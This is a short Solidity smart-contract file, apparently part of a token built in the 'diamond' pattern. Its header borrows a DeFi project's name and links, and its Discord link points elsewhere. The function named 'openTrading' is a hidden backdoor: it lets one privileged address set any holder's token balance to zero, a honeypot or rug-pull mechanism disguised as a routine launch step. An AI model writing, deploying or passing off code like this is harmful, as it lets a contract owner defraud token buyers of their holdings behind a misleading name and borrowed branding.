/*
 * SPDX-License-Identifier: MIT
 * Website: https://redstone.finance/
 * Whitepaper: https://docs.redstone.finance/docs/introduction
 * Twitter: https://twitter.com/redstone_defi
 * Telegram Group: https://t.me/redstonefinance/
 * Discord Chat: https://airdrops.io/visit/4hn2/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
